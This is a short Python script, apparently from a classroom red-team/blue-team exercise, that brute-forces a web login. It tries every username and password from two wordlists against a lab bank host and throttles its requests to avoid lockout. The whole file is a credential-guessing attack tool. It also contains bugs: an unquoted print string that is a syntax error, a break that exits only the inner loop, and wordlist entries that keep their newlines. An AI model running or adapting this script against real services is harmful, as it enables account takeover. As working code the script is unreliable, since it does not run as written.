import requests
import time

usernames_file = open('usernames.txt','r')
passwords_file = open('passwords.txt', 'r')

username_lines = usernames_file.readlines()
password_lines = passwords_file.readlines()

matched_uername = ''
matched_password = ''
is_match = False
login_req_count = 0

url = "http://blue.uscbank4.usc430"
for username in username_lines:
    for password in password_lines:
        if (login_req_count == 5):
            time.sleep(5)
            login_req_count = 0

        login_req = requests.get(url, params={"user":username,"pass":password}) #Can be changed as per Opposite Blue Team's login request URL
        login_req_count += 1
        if(login_req.text == "Login Successfull"): # Condition need to change as per Opposite Blue Team's Successfull Login Response Message
            matched_uername = username
            matched_password = password
            is_match = True
            break

if(is_match):
    print("Username and Password Match found")
    print("Matched Username : "+matched_uername)
    print("Matched Password : "+matched_password)

else:
    print(No matching username and password found)

        
